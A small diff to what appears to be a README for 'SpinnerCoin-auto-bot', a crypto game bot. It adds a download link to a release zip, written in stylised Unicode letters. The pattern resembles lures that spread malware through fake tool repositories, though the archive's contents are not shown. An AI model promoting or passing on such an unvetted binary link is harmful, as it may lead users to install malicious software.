@@ -2,7 +2,7 @@
   
 ## UPDATE 19.07.2024
 
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/PedroFigueredo560/SpinnerCoin-auto-bot/releases/download/SpinnerCoin-auto-bot/SpinnerCoin-auto-bot.zip)***
 
 # ⚡️ SpinnerCoin-auto-bot
 
